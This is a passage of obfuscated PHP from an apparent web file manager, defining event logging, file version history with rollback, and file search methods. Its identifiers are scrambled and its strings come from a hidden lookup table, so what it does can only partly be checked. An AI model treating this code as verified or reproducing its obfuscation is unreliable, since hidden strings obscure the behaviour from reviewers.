$Îö÷î¨± =& $_SERVER[Ş­ğŠìÒ]; if ($Ä«Ã˜€¢[$Îö÷î¨±[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($ª£¼¸ == $Îö÷î¨±[1931]) { return !1; } return !0; } public function eventCreate($îÖÙ¥ Ú, $ÍŒ¤Ï) { $¬Ê»òÜ÷ =& $_SERVER[Ş­ğŠìÒ]; $Áêæ™Œ§ = Model($¬Ê»òÜ÷[1414])->sourceInfo($îÖÙ¥ Ú); $ûñˆÇÉ» = array($¬Ê»òÜ÷[2194] => $ÍŒ¤Ï, $¬Ê»òÜ÷[32] => $Áêæ™Œ§[$¬Ê»òÜ÷[32]]); return $this->addEvent($îÖÙ¥ Ú, $¬Ê»òÜ÷[2193], $ûñˆÇÉ»); } public function eventFileEdit($óó«’„‘) { $•”‹÷¢× =& $_SERVER[Ş­ğŠìÒ]; $°ÛÑ‚†ö = array($•”‹÷¢×[2200] => $_SERVER[$•”‹÷¢×[2201]], $•”‹÷¢×[2202] => strtolower(ACTION)); if (isset($GLOBALS[$•”‹÷¢×[7]][$•”‹÷¢×[2203]])) { $°ÛÑ‚†ö[$•”‹÷¢×[2203]] = $•”‹÷¢×[91]; } return $this->addEvent($óó«’„‘, $•”‹÷¢×[1932], $°ÛÑ‚†ö); } public function eventRecycle($ú©Á³Ùã, $¨Îã°âÙ) { return $this->addEvent($ú©Á³Ùã, $_SERVER[Ş­ğŠìÒ][2195], $¨Îã°âÙ); } private static $_removeLast = ''; public function eventRemove($ŠßæÂ¥ò) { $æ¤âÀ€ =& $_SERVER[Ş­ğŠìÒ]; self::$_removeLast = $ŠßæÂ¥ò; $âÛ¬‡û¢ = Model($æ¤âÀ€[1414])->sourceInfo($ŠßæÂ¥ò); $âÃ«ê‚é = array_field_key($âÛ¬‡û¢, array($æ¤âÀ€[193], $æ¤âÀ€[541], $æ¤âÀ€[505], $æ¤âÀ€[584])); $’Ä¼ëÉÃ = array($æ¤âÀ€[171] => $âÛ¬‡û¢[$æ¤âÀ€[32]], $æ¤âÀ€[2202] => ACTION, $æ¤âÀ€[2204] => $âÃ«ê‚é); return $this->addEvent($âÛ¬‡û¢[$æ¤âÀ€[192]], $æ¤âÀ€[1931], $’Ä¼ëÉÃ); } public function eventShare($ªİîß“¯, $¿®åñÎİ) { return $this->addEvent($ªİîß“¯, $_SERVER[Ş­ğŠìÒ][1942], $¿®åñÎİ); } public function eventMove($ëÈ¸¨˜À, $ªºÛé…, $¨Ì“˜Ÿ§) { $ë­î˜ª =& $_SERVER[Ş­ğŠìÒ]; if (self::$_removeLast == $ëÈ¸¨˜À) { return; } $Ô–äÓ÷É = Model($ë­î˜ª[1414]); $²²æçƒ = $Ô–äÓ÷É->sourceInfo($ëÈ¸¨˜À); $Ñ…œñ™Ø = $Ô–äÓ÷É->sourceInfo($ªºÛé…); $˜Œš·â— = $Ô–äÓ÷É->sourceInfo($¨Ì“˜Ÿ§); $¤™¼é‰å = array($ë­î˜ª[1237] => $ªºÛé…, $ë­î˜ª[2205] => $Ñ…œñ™Ø[$ë­î˜ª[32]], $ë­î˜ª[2181] => !empty($Ñ…œñ™Ø[$ë­î˜ª[582]]) ? $Ñ…œñ™Ø[$ë­î˜ª[582]] : $ë­î˜ª[12], $ë­î˜ª[1238] => $¨Ì“˜Ÿ§, $ë­î˜ª[2206] => $˜Œš·â—[$ë­î˜ª[32]], $ë­î˜ª[2207] => !empty($˜Œš·â—[$ë­î˜ª[582]]) ? $˜Œš·â—[$ë­î˜ª[582]] : $ë­î˜ª[12]); $this->addEvent($ëÈ¸¨˜À, $ë­î˜ª[620], $¤™¼é‰å); $²²æçƒ = $Ô–äÓ÷É->sourceInfo($ëÈ¸¨˜À); $¤™¼é‰å = array($ë­î˜ª[193] => $²²æçƒ[$ë­î˜ª[193]], $ë­î˜ª[32] => $²²æçƒ[$ë­î˜ª[32]]); $this->addEvent($ªºÛé…, $ë­î˜ª[2208], $¤™¼é‰å); } public function eventCopy($âßë»¬À) { $this->eventCreate($âßë»¬À, $_SERVER[Ş­ğŠìÒ][618]); } public function eventRename($×Ò×Äêú, $½æ¯µ©, $£ñé¾ã) { $¤½üé…ë =& $_SERVER[Ş­ğŠìÒ]; $æ‘Ÿüœ¢ = array($¤½üé…ë[1237] => $½æ¯µ©, $¤½üé…ë[1238] => $£ñé¾ã); return $this->addEvent($×Ò×Äêú, $¤½üé…ë[1428], $æ‘Ÿüœ¢); } public function eventAddComment($èùœØôÕ, $®Ô†Ë¹º) { return $this->addEvent($èùœØôÕ, $_SERVER[Ş­ğŠìÒ][2209], $®Ô†Ë¹º); } public function eventAddDesc($ĞŞÀåÂ¤, $œÅ¯÷Ä¾) { return $this->addEvent($ĞŞÀåÂ¤, $_SERVER[Ş­ğŠìÒ][2210], $œÅ¯÷Ä¾); } public function listBySource($úÌáçğÆ) { $ê¯‚ù¸« =& $_SERVER[Ş­ğŠìÒ]; $»ÂÀëå² = Model($ê¯‚ù¸«[1414])->sourceInfo($úÌáçğÆ); $ÕÔÇÄî¤ = array($ê¯‚ù¸«[491] => $úÌáçğÆ); if ($»ÂÀëå²[$ê¯‚ù¸«[485]] == $ê¯‚ù¸«[91]) { $Áô„íÏ¨ = Model($ê¯‚ù¸«[1414])->listSearchChildren($úÌáçğÆ, 20000); $Áô„íÏ¨[] = $úÌáçğÆ . $ê¯‚ù¸«[454]; $ÕÔÇÄî¤ = array($ê¯‚ù¸«[193] => array($ê¯‚ù¸«[7], $Áô„íÏ¨)); } $ˆ«¿Ìé  = $this->where($ÕÔÇÄî¤)->order($ê¯‚ù¸«[2211])->selectPage(); if ($ˆ«¿Ìé [$ê¯‚ù¸«[442]][$ê¯‚ù¸«[443]] == 0) { $ˆ«¿Ìé [$ê¯‚ù¸«[442]][$ê¯‚ù¸«[443]] = 1; $ˆ«¿Ìé [$ê¯‚ù¸«[445]] = array(array($ê¯‚ù¸«[491] => $úÌáçğÆ, $ê¯‚ù¸«[2191] => $»ÂÀëå²[$ê¯‚ù¸«[192]], $ê¯‚ù¸«[1755] => $»ÂÀëå²[$ê¯‚ù¸«[527]], $ê¯‚ù¸«[496] => $ê¯‚ù¸«[2212], $ê¯‚ù¸«[497] => $»ÂÀëå²[$ê¯‚ù¸«[231]], $ê¯‚ù¸«[1757] => $ê¯‚ù¸«[12])); } return $this->eventListParse($ˆ«¿Ìé , $úÌáçğÆ); } private function eventListParse($‡‹‹åÅ‚, $Ç…·ÌƒÄ) { $¤ˆƒïÚÉ =& $_SERVER[Ş­ğŠìÒ]; $È™è©Û = $‡‹‹åÅ‚[$¤ˆƒïÚÉ[445]]; $ıÂä®ø” = array_to_keyvalue($È™è©Û, $¤ˆƒïÚÉ[12], $¤ˆƒïÚÉ[193]); $õ©éÉ‹’ = array_to_keyvalue($È™è©Û, $¤ˆƒïÚÉ[12], $¤ˆƒïÚÉ[2197]); foreach ($È™è©Û as $Ü²÷ß‡«) { $ÀÜåÛ = $Ü²÷ß‡«[$¤ˆƒïÚÉ[526]]; if ($Ü²÷ß‡«[$¤ˆƒïÚÉ[33]] == $¤ˆƒïÚÉ[620] && isset($ÀÜåÛ[$¤ˆƒïÚÉ[1237]])) { $ıÂä®ø”[] = $ÀÜåÛ[$¤ˆƒïÚÉ[1237]] . $¤ˆƒïÚÉ[12]; $ıÂä®ø”[] = $ÀÜåÛ[$¤ˆƒïÚÉ[1238]] . $¤ˆƒïÚÉ[12]; } if ($Ü²÷ß‡«[$¤ˆƒïÚÉ[33]] == $¤ˆƒïÚÉ[2208] && isset($ÀÜåÛ[$¤ˆƒïÚÉ[193]])) { $ıÂä®ø”[] = $ÀÜåÛ[$¤ˆƒïÚÉ[193]] . $¤ˆƒïÚÉ[12]; } } $ıÂä®ø” = array_merge($ıÂä®ø”, $õ©éÉ‹’, array($Ç…·ÌƒÄ . $¤ˆƒïÚÉ[12])); $ıÂä®ø” = array_unique($ıÂä®ø”); $”ª¹¶§ = array_unique(array_to_keyvalue($È™è©Û, $¤ˆƒïÚÉ[12], $¤ˆƒïÚÉ[1764])); $½¡ÔëÉ« = Model($¤ˆƒïÚÉ[598])->userListInfo($”ª¹¶§); $¾†ñ¼ïî = Model($¤ˆƒïÚÉ[891])->sourceListInfo($ıÂä®ø”, !0); foreach ($È™è©Û as &$Ü²÷ß‡«) { if ($Ü²÷ß‡«[$¤ˆƒïÚÉ[33]] == $¤ˆƒïÚÉ[620] && isset($Ü²÷ß‡«[$¤ˆƒïÚÉ[526]][$¤ˆƒïÚÉ[1237]])) { $Ü²÷ß‡«[$¤ˆƒïÚÉ[526]][$¤ˆƒïÚÉ[1237]] = $¾†ñ¼ïî[$Ü²÷ß‡«[$¤ˆƒïÚÉ[526]][$¤ˆƒïÚÉ[1237]]]; $Ü²÷ß‡«[$¤ˆƒïÚÉ[526]][$¤ˆƒïÚÉ[1238]] = $¾†ñ¼ïî[$Ü²÷ß‡«[$¤ˆƒïÚÉ[526]][$¤ˆƒïÚÉ[1238]]]; } if ($Ü²÷ß‡«[$¤ˆƒïÚÉ[33]] == $¤ˆƒïÚÉ[2208] && isset($Ü²÷ß‡«[$¤ˆƒïÚÉ[526]][$¤ˆƒïÚÉ[193]])) { $Ü²÷ß‡«[$¤ˆƒïÚÉ[526]][$¤ˆƒïÚÉ[193]] = $¾†ñ¼ïî[$Ü²÷ß‡«[$¤ˆƒïÚÉ[526]][$¤ˆƒïÚÉ[193]]]; } $Ü²÷ß‡«[$¤ˆƒïÚÉ[90]] = $¾†ñ¼ïî[$Ü²÷ß‡«[$¤ˆƒïÚÉ[193]]]; $Ü²÷ß‡«[$¤ˆƒïÚÉ[2213]] = $¾†ñ¼ïî[$Ü²÷ß‡«[$¤ˆƒïÚÉ[2197]]]; if ($Ü²÷ß‡«[$¤ˆƒïÚÉ[33]] == $¤ˆƒïÚÉ[1931]) { $Ü²÷ß‡«[$¤ˆƒïÚÉ[2213]] = $Ü²÷ß‡«[$¤ˆƒïÚÉ[90]]; $Ü²÷ß‡«[$¤ˆƒïÚÉ[2197]] = $Ü²÷ß‡«[$¤ˆƒïÚÉ[2213]][$¤ˆƒïÚÉ[193]]; $Ü²÷ß‡«[$¤ˆƒïÚÉ[90]] = !1; $Ü²÷ß‡«[$¤ˆƒïÚÉ[193]] = $¤ˆƒïÚÉ[12]; } $Ü²÷ß‡«[$¤ˆƒïÚÉ[2140]] = $½¡ÔëÉ«[$Ü²÷ß‡«[$¤ˆƒïÚÉ[1764]]]; } unset($Ü²÷ß‡«); $‡‹‹åÅ‚[$¤ˆƒïÚÉ[445]] = $È™è©Û; return $‡‹‹åÅ‚; } public function removeBySource($»™Èæ„») { $æ¢êèË = array($_SERVER[Ş­ğŠìÒ][491] => $»™Èæ„»); $this->where($æ¢êèË)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\x75\x72\143\x65\x5f\x68\151\163\164\157\x72\x79"; public function historyCount($É§ªÌ™¯) { $¨÷³åñŸ =& $_SERVER[Ş­ğŠìÒ]; if (!$É§ªÌ™¯) { return array(); } if (is_string($É§ªÌ™¯) || is_int($É§ªÌ™¯)) { $É§ªÌ™¯ = array($É§ªÌ™¯); } $ „÷­ = array($¨÷³åñŸ[193], $¨÷³åñŸ[1997] => $¨÷³åñŸ[565]); $Å¼úÓ™ú = array($¨÷³åñŸ[193] => array($¨÷³åñŸ[7], $É§ªÌ™¯)); $Ëº°§»£ = $this->field($ „÷­)->where($Å¼úÓ™ú)->group($¨÷³åñŸ[193])->select(); return array_to_keyvalue($Ëº°§»£, $¨÷³åñŸ[193], $¨÷³åñŸ[565]); } public function addHistory($é²œ®†¨, $ËÃß¢¿ = '') { $ˆˆÌ…ÛÅ =& $_SERVER[Ş­ğŠìÒ]; $”â¦îÉ± = array($ˆˆÌ…ÛÅ[491] => $é²œ®†¨[$ˆˆÌ…ÛÅ[193]], $ˆˆÌ…ÛÅ[1755] => isset($é²œ®†¨[$ˆˆÌ…ÛÅ[529]]) ? $é²œ®†¨[$ˆˆÌ…ÛÅ[529]] : $é²œ®†¨[$ˆˆÌ…ÛÅ[527]], $ˆˆÌ…ÛÅ[542] => $é²œ®†¨[$ˆˆÌ…ÛÅ[541]], $ˆˆÌ…ÛÅ[617] => $é²œ®†¨[$ˆˆÌ…ÛÅ[79]], $ˆˆÌ…ÛÅ[2214] => $ËÃß¢¿); if ($GLOBALS[$ˆˆÌ…ÛÅ[6]][$ˆˆÌ…ÛÅ[92]][$ˆˆÌ…ÛÅ[1298]] >= 1) { $this->historyAutoClear($”â¦îÉ±[$ˆˆÌ…ÛÅ[193]]); $this->add($”â¦îÉ±); } Hook::trigger($ˆˆÌ…ÛÅ[2215], $”â¦îÉ±); Model($ˆˆÌ…ÛÅ[2216])->eventFileEdit($é²œ®†¨[$ˆˆÌ…ÛÅ[193]]); } private function historyAutoClear($òáÌŸ±½) { $å‚úö—ù =& $_SERVER[Ş­ğŠìÒ]; $ˆÄ¤äÄà = Model($å‚úö—ù[837])->get($å‚úö—ù[1320]); $º§‘İ± = intval($GLOBALS[$å‚úö—ù[6]][$å‚úö—ù[92]][$å‚úö—ù[1298]]); $³ÀçÉÔµ = $ˆÄ¤äÄà == $å‚úö—ù[1321] ? min(5, $º§‘İ±) : $º§‘İ±; $³ÀçÉÔµ = $³ÀçÉÔµ <= 0 ? 0 : $³ÀçÉÔµ - 1; if ($³ÀçÉÔµ >= 499) { return; } $–Ô¤Âã´ = array($å‚úö—ù[491] => $òáÌŸ±½); $Öø ©Ïà = $this->field($å‚úö—ù[2217])->where($–Ô¤Âã´)->order($å‚úö—ù[2211])->select(); if (!$Öø ©Ïà || $³ÀçÉÔµ >= count($Öø ©Ïà)) { return; } $ÈÅúõîÁ = array_to_keyvalue($Öø ©Ïà, $å‚úö—ù[12], $å‚úö—ù[475]); $ÈÅúõîÁ = array_slice($ÈÅúõîÁ, $³ÀçÉÔµ); $œ½¼Ò·¶ = array_to_keyvalue($Öø ©Ïà, $å‚úö—ù[12], $å‚úö—ù[541]); $œ½¼Ò·¶ = array_slice($œ½¼Ò·¶, $³ÀçÉÔµ); if (!$ÈÅúõîÁ || !$œ½¼Ò·¶) { return; } $–Ô¤Âã´ = array($å‚úö—ù[493] => array($å‚úö—ù[7], $ÈÅúõîÁ)); $this->where($–Ô¤Âã´)->delete(); Model($å‚úö—ù[544])->remove($œ½¼Ò·¶); } public function listData($¶Ñ‡¨) { $»ë°ª‘” =& $_SERVER[Ş­ğŠìÒ]; $šÀõóÎÛ = array($»ë°ª‘”[491] => $¶Ñ‡¨); $ôŸè™´ = $»ë°ª‘”[2218]; $ßÇ“¢—± = $this->field($ôŸè™´)->where($šÀõóÎÛ)->order($»ë°ª‘”[2211])->selectPage(); $this->_listAppendUser($ßÇ“¢—±[$»ë°ª‘”[445]]); $Æ­¥´ = Model($»ë°ª‘”[837])->get($»ë°ª‘”[1320]); $ãã‡Åû = 5; if ($Æ­¥´ == $»ë°ª‘”[1321]) { $ßÇ“¢—±[$»ë°ª‘”[445]] = array_slice($ßÇ“¢—±[$»ë°ª‘”[445]], 0, $ãã‡Åû); $ßÇ“¢—±[$»ë°ª‘”[442]] = array($»ë°ª‘”[2219] => 1, $»ë°ª‘”[2220] => 20, $»ë°ª‘”[2221] => 1, $»ë°ª‘”[2222] => count($ßÇ“¢—±[$»ë°ª‘”[445]])); } return $ßÇ“¢—±; } protected function _listAppendUser(&$Èİˆ¼„Ö) { $Ç¯¸©ò =& $_SERVER[Ş­ğŠìÒ]; $‚€¢÷Åá = array_to_keyvalue($Èİˆ¼„Ö, $Ç¯¸©ò[12], $Ç¯¸©ò[1764]); $¸ö¥ôŞê = Model($Ç¯¸©ò[598])->userListInfo($‚€¢÷Åá); foreach ($Èİˆ¼„Ö as &$©Ü…¥¹Ü) { $°Ã‚ñ´ê = $©Ü…¥¹Ü[$Ç¯¸©ò[1764]]; $©Ü…¥¹Ü[$Ç¯¸©ò[527]] = $¸ö¥ôŞê[$°Ã‚ñ´ê] ? $¸ö¥ôŞê[$°Ã‚ñ´ê] : !1; } unset($©Ü…¥¹Ü); } public function fileInfo($·øèÛ§) { $ı¸µ‘Ê =& $_SERVER[Ş­ğŠìÒ]; $ìæ–°† = $this->tablePrefix; $êæä€•× = "{$ìæ–°†}\151\x6f\137\x66\x69\x6c\145\x20\146\x69\x6c\145\163\40\157\x6e\40\x66\151\x6c\x65\x73\56\146\x69\x6c\x65\111\104\x20\75\40\x68\x69\163\164\x6f\162\x79\56\146\151\x6c\x65\111\x44"; return $this->alias($ı¸µ‘Ê[2223])->where(array($ı¸µ‘Ê[493] => $·øèÛ§))->join($êæä€•×, $ı¸µ‘Ê[2224])->find(); } public function removeItem($­™çĞÌš) { $ñ–úÃ¿ =& $_SERVER[Ş­ğŠìÒ]; $ÒÇõÃ¾Ë = array($ñ–úÃ¿[493] => $­™çĞÌš); $àÖİ™é = $this->where($ÒÇõÃ¾Ë)->find(); if ($àÖİ™é) { $ë±ìÖÙ = $this->where($ÒÇõÃ¾Ë)->delete(); Model($ñ–úÃ¿[544])->remove($àÖİ™é[$ñ–úÃ¿[541]]); return $ë±ìÖÙ; } return !1; } public function removeBySource($°´úŒ½) { $„èØ¶¨ =& $_SERVER[Ş­ğŠìÒ]; if (!$°´úŒ½) { return !1; } if (!is_array($°´úŒ½)) { $°´úŒ½ = array($°´úŒ½); } $È ²õø = array($„èØ¶¨[491] => array($„èØ¶¨[7], $°´úŒ½)); $·™ŠÕÎ‡ = $this->field($„èØ¶¨[542])->where($È ²õø)->select(); if ($·™ŠÕÎ‡) { $this->where($È ²õø)->delete(); $Õ«û¸áÌ = array_to_keyvalue($·™ŠÕÎ‡, $„èØ¶¨[12], $„èØ¶¨[541]); Model($„èØ¶¨[544])->remove($Õ«û¸áÌ); } return !0; } public function setDetail($ãü¸èÅŸ, $¼Œ÷Öê¡) { $ÜØ’Ş€Ö =& $_SERVER[Ş­ğŠìÒ]; return $this->where(array($ÜØ’Ş€Ö[493] => $ãü¸èÅŸ))->save(array($ÜØ’Ş€Ö[2214] => $¼Œ÷Öê¡)); } public function rollbackToItem($ÜÊÃ÷, $‹«ß¦Ê) { $äşÚ ™ =& $_SERVER[Ş­ğŠìÒ]; $›°şô¶‚ = Model($äşÚ ™[891])->sourceInfo($ÜÊÃ÷); $this->addHistory($›°şô¶‚, LNG($äşÚ ™[2225])); $õÉÓÈ³ = $this->find($‹«ß¦Ê); $ÕñŸü¥ğ = array($äşÚ ™[541] => $õÉÓÈ³[$äşÚ ™[541]], $äşÚ ™[79] => $õÉÓÈ³[$äşÚ ™[79]], $äşÚ ™[88] => time(), $äşÚ ™[529] => USER_ID); Model($äşÚ ™[891])->where(array($äşÚ ™[193] => $ÜÊÃ÷))->save($ÕñŸü¥ğ); return $this->where(array($äşÚ ™[493] => $‹«ß¦Ê))->delete(); } public function clearSame($ìµëã´Ñ) { $ÍµÍ¢ËÇ =& $_SERVER[Ş­ğŠìÒ]; $İ¶—‚ˆ” = $this->listData($ìµëã´Ñ); $ƒğÂ­ñ = array_to_keyvalue_group($İ¶—‚ˆ”, $ÍµÍ¢ËÇ[541]); $ÄÜÌóıÅ = array(); $ïàê‘ïã = array(); foreach ($ƒğÂ­ñ as $æê—Ñíö) { if (!$æê—Ñíö || count($æê—Ñíö) <= 1) { continue; } foreach ($æê—Ñíö as $ïºåâı¶) { $ÄÜÌóıÅ[] = $ïºåâı¶[$ÍµÍ¢ËÇ[541]]; $ïàê‘ïã[] = $ïºåâı¶[$ÍµÍ¢ËÇ[475]]; } } if (!$ïàê‘ïã) { return; } $this->where(array($ÍµÍ¢ËÇ[475] => array($ÍµÍ¢ËÇ[7], $ïàê‘ïã)))->delete(); Model($ÍµÍ¢ËÇ[544])->remove($ÄÜÌóıÅ); } public function userSpace() { $ö€¤ïî¨ =& $_SERVER[Ş­ğŠìÒ]; $»’ğ¸İİ = $this->tablePrefix; $±Ú³äË = array($ö€¤ïî¨[1755] => USER_ID); $øÆ¿‚Óú = "{$»’ğ¸İİ}\x69\157\x5f\x66\151\x6c\x65\40\x66\151\x6c\x65\163\40\157\156\x20\146\151\x6c\x65\x73\x2e\x66\151\154\145\111\104\40\x3d\x20\150\151\x73\x74\157\162\171\x2e\146\151\154\x65\x49\x44"; return $this->alias($ö€¤ïî¨[2223])->where($±Ú³äË)->join($øÆ¿‚Óú, $ö€¤ïî¨[2224])->sum($ö€¤ïî¨[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($‹’üå¡¢) { $Å¶ùÛÈÔ =& $_SERVER[Ş­ğŠìÒ]; $¼şÛÕ¾ø = KodIO::fileTypeList(); $©«ÇŸğí = $¼şÛÕ¾ø[$‹’üå¡¢]; if (!$©«ÇŸğí) { return array(); } $ëÈîšô¾ = $©«ÇŸğí[$Å¶ùÛÈÔ[169]]; $•€ÜÕ¤ = $Å¶ùÛÈÔ[7]; if (!$©«ÇŸğí[$Å¶ùÛÈÔ[169]]) { $ƒØ´…¯Ó = array_to_keyvalue($¼şÛÕ¾ø, $Å¶ùÛÈÔ[12], $Å¶ùÛÈÔ[169]); $ëÈîšô¾ = implode($Å¶ùÛÈÔ[50], $ƒØ´…¯Ó); $•€ÜÕ¤ = $Å¶ùÛÈÔ[2226]; } $ıú•Üòï = explode($Å¶ùÛÈÔ[50], trim($ëÈîšô¾, $Å¶ùÛÈÔ[50])); return array($•€ÜÕ¤, $ıú•Üòï); } public function listPathType($Îëƒ‚Šõ) { $ÇÎòÑ„ =& $_SERVER[Ş­ğŠìÒ]; $Ğ«ÓÍ³¾ = $this->fileTypeWhere($Îëƒ‚Šõ); if (!$Ğ«ÓÍ³¾) { return array(); } $±Œêìóœ = USER_ID; $üß§¼Û´ = Model($ÇÎòÑ„[598])->getInfo($±Œêìóœ); $ÕÈÕÑú = array($ÇÎòÑ„[648] => SourceModel::TYPE_USER, $ÇÎòÑ„[584] => array($ÇÎòÑ„[612], $ÇÎòÑ„[594] . $üß§¼Û´[$ÇÎòÑ„[90]][$ÇÎòÑ„[193]] . $ÇÎòÑ„[613]), $ÇÎòÑ„[649] => $±Œêìóœ, $ÇÎòÑ„[646] => 0, $ÇÎòÑ„[647] => $Ğ«ÓÍ³¾); return $this->listSource($ÕÈÕÑú); } public function listSearch($â²öŒÜ‘, $¿öÚì¤ß = 300) { $ÍÎê‘‘ =& $_SERVER[Ş­ğŠìÒ]; if (isset($â²öŒÜ‘[$ÍÎê‘‘[2062]]) && $â²öŒÜ‘[$ÍÎê‘‘[2062]]) { $â²öŒÜ‘[$ÍÎê‘‘[2062]] = str_replace($ÍÎê‘‘[460], $ÍÎê‘‘[2227], trim($â²öŒÜ‘[$ÍÎê‘‘[2062]])); } $óóÃ¥Ş = $this->_parseSearchWhere($â²öŒÜ‘); if (!isset($óóÃ¥Ş[$ÍÎê‘‘[505]])) { $óóÃ¥Ş[$ÍÎê‘‘[505]] = 0; } $™ÛÓ“ = $ÍÎê‘‘[2228]; $íûÇ¿Şó = $óóÃ¥Ş; $û¦„•‰© = $™ÛÓ“; $this->_listSearchBindPinyin($â²öŒÜ‘, $óóÃ¥Ş, $™ÛÓ“); $this->alias($ÍÎê‘‘[519])->_makeOrder(); $óóÃ¥Ş = $this->parseWhereLike($óóÃ¥Ş); $°ë…»± = $this->distinct(!0)->field($™ÛÓ“)->where($óóÃ¥Ş)->selectPage($¿öÚì¤ß); if ($GLOBALS[$ÍÎê‘‘[6]][$ÍÎê‘‘[457]][$ÍÎê‘‘[458]] && Input::check($â²öŒÜ‘[$ÍÎê‘‘[2062]], $ÍÎê‘‘[655]) && $°ë…»±[$ÍÎê‘‘[442]][$ÍÎê‘‘[429]] == 1 && $°ë…»±[$ÍÎê‘‘[442]][$ÍÎê‘‘[443]] == 0) { $°ë…»± = $this->distinct(!0)->field($™ÛÓ“)->where($íûÇ¿Şó)->limit(1000)->select(); $°ë…»± = array_page_split($°ë…»±, !1, $¿öÚì¤ß); } $this->_listSearchFileContent($°ë…»±, $â²öŒÜ‘, $û¦„•‰©, $íûÇ¿Şó); $this->_listSearchDesc($°ë…»±, $â²öŒÜ‘, $û¦„•‰©); $this->_listSearchTag($°ë…»±, $â²öŒÜ‘, $û¦„•‰©); $this->_listSearchGroupTag($°ë…»±, $â²öŒÜ‘, $û¦„•‰©); $this->_listDataApply($°ë…»±[$ÍÎê‘‘[445]]); $this->_listMake($°ë…»±); return $°ë…»±; } private function _listSearchFileContent(&$ä™â¦ßà, $¹¡æúÑü, $˜ÎûË”, $‚ìÚä§Ë) { $İûê˜¦  =& $_SERVER[Ş­ğŠìÒ]; if (!$¹¡æúÑü[$İûê˜¦ [2062]] || $ä™â¦ßà[$İûê˜¦ [442]][$İûê˜¦ [429]] > 1) { return; } if (!isset($‚ìÚä§Ë[$İûê˜¦ [32]]) || !is_array($¹¡æúÑü[$İûê˜¦ [541]])) { return; } $‚ìÚä§Ë[$İûê˜¦ [541]] = array($İûê˜¦ [7], $¹¡æúÑü[$İûê˜¦ [541]]); unset($‚ìÚä§Ë[$İûê˜¦ [32]]); unset($¹¡æúÑü[$İûê˜¦ [541]]); $Šş«Òáª = $this->field($˜ÎûË”)->where($‚ìÚä§Ë)->limit($İûê˜¦ [2229])->select(); if (!$Šş«Òáª || count($Šş«Òáª) == 0) { return; } $ä™â¦ßà[$İûê˜¦ [445]] = array_merge($Šş«Òáª, $ä™â¦ßà[$İûê˜¦ [445]]); $ä™â¦ßà[$İûê˜¦ [442]][$İûê˜¦ [443]] += count($Šş«Òáª); } private function _listSearchTag(&$æ‹Û¦, $Á¼Ëñ“, $š¦Ù–É) { $­È•¾º =& $_SERVER[Ş­ğŠìÒ]; if (!$Á¼Ëñ“[$­È•¾º[2062]] || $æ‹Û¦[$­È•¾º[442]][$­È•¾º[429]] > 1) { return; } $ä÷£•¡ = Model($­È•¾º[2230])->listData(); $Æ„¡¶ü„ = array(); $ÙšŸ³ö¡ = $Á¼Ëñ“[$­È•¾º[2062]]; foreach ($ä÷£•¡ as $·ª€‘¼¸) { $åùÌ²² = $·ª€‘¼¸[$­È•¾º[32]]; $¢ÍŞéŒò = str_replace($­È•¾º[53], $­È•¾º[12], Pinyin::get($åùÌ²²)); if (stripos($åùÌ²², $ÙšŸ³ö¡) !== !1 || stripos($¢ÍŞéŒò, $ÙšŸ³ö¡) !== !1) { $Æ„¡¶ü„[] = $·ª€‘¼¸[$­È•¾º[475]]; } } if (!$Æ„¡¶ü„) { return; } $Ã¤°Ë›‡ = array($­È•¾º[500] => array($­È•¾º[7], $Æ„¡¶ü„), $­È•¾º[1764] => USER_ID); $ƒÎàŸ±ø = Model($­È•¾º[502])->field($­È•¾º[87])->where($Ã¤°Ë›‡)->select(); $ƒÎàŸ±ø = array_to_keyvalue($ƒÎàŸ±ø, $­È•¾º[12], $­È•¾º[87]); $½ÅÅ­ª = array_unique($ƒÎàŸ±ø); $this->_listSearchMerge($æ‹Û¦, $Á¼Ëñ“, $š¦Ù–É, $½ÅÅ­ª); } private function _listSearchDesc(&$²˜Çõ†÷, $¶Ù«ı·ï, $œùîÒ‚Î) { $¡œ¨„ò¨ =& $_SERVER[Ş­ğŠìÒ]; if (!$¶Ù«ı·ï[$¡œ¨„ò¨[2062]] || $²˜Çõ†÷[$¡œ¨„ò¨[442]][$¡œ¨„ò¨[429]] > 1) { return; } $ã˜¾«ÈŠ = array($¡œ¨„ò¨[97] => $¡œ¨„ò¨[526], $¡œ¨„ò¨[450] => array($¡œ¨„ò¨[459], $¡œ¨„ò¨[2064] . $¶Ù«ı·ï[$¡œ¨„ò¨[2062]] . $¡œ¨„ò¨[2064])); $İóûğĞ€ = !1; if ($İóûğĞ€) { $È£èÑÕ  = $this->listSearchChildren($¶Ù«ı·ï[$¡œ¨„ò¨[192]]); $È£èÑÕ  = array_unique($È£èÑÕ ); if (!$È£èÑÕ ) { return; } $ã˜¾«ÈŠ[$¡œ¨„ò¨[193]] = array($¡œ¨„ò¨[7], $È£èÑÕ ); } $÷©¢„‰ = Model($¡œ¨„ò¨[632])->field($¡œ¨„ò¨[193])->where($ã˜¾«ÈŠ)->limit(5000)->select(); $ø²çüº¸ = array_to_keyvalue($÷©¢„‰, $¡œ¨„ò¨[12], $¡œ¨„ò¨[193]); $this->_listSearchMerge($²˜Çõ†÷, $¶Ù«ı·ï, $œùîÒ‚Î, $ø²çüº¸); } private function _listSearchGroupTag(&$õ£Ú–ª•, $¹‚œÕŸÎ, $ñ„š¾») { $ĞõÚÔĞŸ =& $_SERVER[Ş­ğŠìÒ]; if (!$¹‚œÕŸÎ[$ĞõÚÔĞŸ[2062]] || $õ£Ú–ª•[$ĞõÚÔĞŸ[442]][$ĞõÚÔĞŸ[429]] > 1 || !$¹‚œÕŸÎ[$ĞõÚÔĞŸ[192]]) { return; } $°¸¶ú´ = $this->sourceInfo($¹‚œÕŸÎ[$ĞõÚÔĞŸ[192]]); if (!$°¸¶ú´ || $°¸¶ú´[$ĞõÚÔĞŸ[190]] != SourceModel::TYPE_GROUP) { return; } $ÅÔ¼Ì‡ö = $°¸¶ú´[$ĞõÚÔĞŸ[569]]; $Äãä´ÉÜ = Model($ĞõÚÔĞŸ[2231])->get($ÅÔ¼Ì‡ö); $™·“Œ´ = array(); $§‚ßˆãÍ = $¹‚œÕŸÎ[$ĞõÚÔĞŸ[2062]]; foreach ($Äãä´ÉÜ[$ĞõÚÔĞŸ[445]] as $à±•¤Á‘) { $³ß»ùù¾ = $à±•¤Á‘[$ĞõÚÔĞŸ[32]]; $ûÚÔµİ = str_replace($ĞõÚÔĞŸ[53], $ĞõÚÔĞŸ[12], Pinyin::get($³ß»ùù¾)); if 